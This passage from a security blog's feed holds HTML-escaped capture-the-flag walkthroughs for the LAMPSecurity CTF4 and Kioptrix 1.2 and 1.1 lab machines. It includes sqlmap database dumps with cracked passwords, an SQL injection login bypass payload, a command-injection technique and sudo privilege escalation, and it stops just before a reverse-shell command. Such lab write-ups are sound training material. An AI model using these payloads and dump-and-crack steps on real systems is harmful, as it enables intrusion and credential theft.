&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;table &lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;database &lt;span class=&quot;s1&quot;&gt;'ehks'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] analyzing table dump &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;possible password hashes
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] recognized possible password hashes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;column &lt;span class=&quot;s1&quot;&gt;'user_pass'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to store hashes to a temporary file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eventual further processing with other tools &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to crack them via a dictionary-based attack? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n/q]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:34] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] using &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;method &lt;span class=&quot;s1&quot;&gt;'md5_generic_passwd'&lt;/span&gt;
what dictionary &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to use?
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] default dictionary file &lt;span class=&quot;s1&quot;&gt;'/usr/share/sqlmap/txt/wordlist.zip'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;press Enter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] custom dictionary file
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] file with list of dictionary files
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:35] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] using default dictionary
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to use common password suffixes? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;slow!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:36] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] starting dictionary-based cracking &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;md5_generic_passwd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:36] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] starting 4 processes
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:37] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'Homesite'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'pmoore'&lt;/span&gt;                                                                                                                       
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'Sue1978'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'jdurbin'&lt;/span&gt;                                                                                                                       
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:39] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'ilike2surf'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'dstevens'&lt;/span&gt;                                                                                                                   
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:42] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'pacman'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'sorzek'&lt;/span&gt;                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:42] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'undone1'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'ghighland'&lt;/span&gt;                                                                                                                     
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:43] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'seventysixers'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'achen'&lt;/span&gt;                                                                                                                   
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:44] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] postprocessing table dump                                                                                                                                           
Database: ehks
Table: user
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;6 entries]
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ilike2surf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;seventysixers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Homesite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sue1978&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pacman&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;undone1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;       |
+---------+-----------+--------------------------------------------------+

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:44] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] table &lt;span class=&quot;s1&quot;&gt;'ehks.`user`'&lt;/span&gt; dumped to CSV file &lt;span class=&quot;s1&quot;&gt;'/root/.sqlmap/output/192.168.30.147/dump/ehks/user-f3649c95.csv'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:44] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetched data logged to text files under &lt;span class=&quot;s1&quot;&gt;'/root/.sqlmap/output/192.168.30.147'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ssh-login&quot;&gt;SSH Login&lt;/h2&gt;

&lt;p&gt;All the dumped accounts appeared to have matching SSH accounts sharing the same credentials as the vulnerable web application.&lt;/p&gt;

&lt;h2 id=&quot;linux-local-privilege-escalation&quot;&gt;Linux Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The account &lt;code&gt;achen&lt;/code&gt; was a memeber of the sudo group.&lt;/p&gt;

&lt;p&gt;The command &lt;code&gt;sudo -s&lt;/code&gt; was executed, successfully escalating privileges to super user.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;achen@ctf4 ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@ctf4 ~]# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user_u:system_r:unconfined_t:SystemLow-SystemHigh
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@ctf4 ~]# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;post-exploitation-enumeration&quot;&gt;Post Exploitation Enumeration&lt;/h2&gt;

&lt;p&gt;There appears to be no root flag, for this capture the flag challenge.&lt;/p&gt;

&lt;p&gt;Additionally &lt;code&gt;.bash_history&lt;/code&gt; contained the root password:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;achen@ctf4 ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;clear
&lt;span class=&quot;nb&quot;&gt;exit
sudo &lt;/span&gt;sy
su
root1234
su
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Kioptrix Level 1.2 Walkthrough</title>
          <link>https://highon.coffee/blog/kioptrix-level-1-2-walkthrough/</link>
          <pubDate>Fri, 20 Dec 2013 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Kioptrix</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/kioptrix-level-1-2-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-investigation&quot; id=&quot;markdown-toc-web-application-investigation&quot;&gt;Web Application Investigation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#non-privileged-shell&quot; id=&quot;markdown-toc-non-privileged-shell&quot;&gt;Non privileged shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;

&lt;h2 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 4.7p1 Debian 8ubuntu1.3 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-investigation&quot;&gt;Web Application Investigation&lt;/h2&gt;

&lt;p&gt;Enumeration of the website discovered it was likely vulnerable to an SQL Injection, entering &lt;code&gt;id='&lt;/code&gt; rendered the following MySQL error:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/sql-error.png&quot; alt=&quot;SQL Error&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SQLMap was used to successfully dump the databases and crack the hashes:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; dev_accounts &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;

Database: gallery
Table: dev_accounts
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2 entries]
+----+------------+---------------------------------------------+
| &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; | username   | password                                    |
+----+------------+---------------------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Mast3r&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;starwars&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+----+------------+---------------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;non-privileged-shell&quot;&gt;Non privileged shell&lt;/h2&gt;

&lt;p&gt;Due to password reuse both accounts were able to ssh, dreg had a limited shell.&lt;/p&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;Local enumeration of loneferrets home dir disclosed:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;loneferret@Kioptrix3:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;editing, creating and viewing files.
Please use the &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sudo ht'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Failure to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;so will result &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;you immediate termination.

DG
CEO&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;sudo ht&lt;/code&gt; rendered a file explorer, the user &lt;code&gt;loneferret&lt;/code&gt; was added to the sudoers group, making privilege escalation trivial.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/sudo-ht.png&quot; alt=&quot;sudo ht&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;loneferret@Kioptrix3:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
root@Kioptrix3:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@Kioptrix3:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        </item>
        
      
    
      
        
        <item>
          <title>Kioptrix Level 1.1 Walkthrough</title>
          <link>https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/</link>
          <pubDate>Fri, 20 Dec 2013 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Kioptrix</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-investigation&quot; id=&quot;markdown-toc-web-application-investigation&quot;&gt;Web Application Investigation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#non-privileged-shell&quot; id=&quot;markdown-toc-non-privileged-shell&quot;&gt;Non privileged shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;

&lt;h2 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 3.9p1 (protocol 1.99)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.0.52 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC Bind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 443&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.0.52 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 631&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;CUPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;CUPS 1.1&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 946&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 3306&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;MySQL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;MySQL (unauthorized)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-investigation&quot;&gt;Web Application Investigation&lt;/h2&gt;

&lt;p&gt;The web form &lt;code&gt;/index.php&lt;/code&gt; was vulnerable to SQL injection, entering the username &lt;code&gt;admin&lt;/code&gt; and the password &lt;code&gt;' or '1'=' &lt;/code&gt; successfully bypassed auth.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/sql-injection-1-1.png&quot; alt=&quot;SQL Injection Auth Bypass&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;SQL Injection - Why does ' or '1'='1 work ?&lt;/h5&gt;
  &lt;p&gt;

  The web application is expecting the SQL query:

  &lt;code&gt;$query = &quot;SELECT * FROM users WHERE username = 'admin' AND password='blah'&quot;;&lt;/code&gt;

  Entering the above &lt;b&gt;injects&lt;/b&gt; the statement after the &lt;code&gt;password='blah'&lt;/code&gt; and before the closing &lt;code&gt;&quot;;&lt;/code&gt;, the entire sql injection query looks like:

  &lt;code&gt;$query = &quot;SELECT * FROM users WHERE username = 'admin' AND password=' or '1'='1&quot;;&quot;&lt;/code&gt;

  &lt;code&gt;1 = 1&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;, thus the statement will return true, allowing an attacker to authenticate as admin. The above injection statement correctly closes the sql syntax, however it is possible to comment out the rest of the sql statement using: &lt;code&gt; -- -&lt;/code&gt;

  &lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/command-injection.png&quot; alt=&quot;Command Injection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The above authentication bypass exposed a web form vulnerable to &lt;b&gt;command injection&lt;/b&gt;, the form filtering only checks for the presence of the ping command with no filtering to prevent an attacker tacking a comment on the end using &lt;code&gt;; insert-command-here&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;non-privileged-shell&quot;&gt;Non privileged shell&lt;/h2&gt;

&lt;p&gt;A non privileged reverse shell was obtained using:&lt;/p&gt;

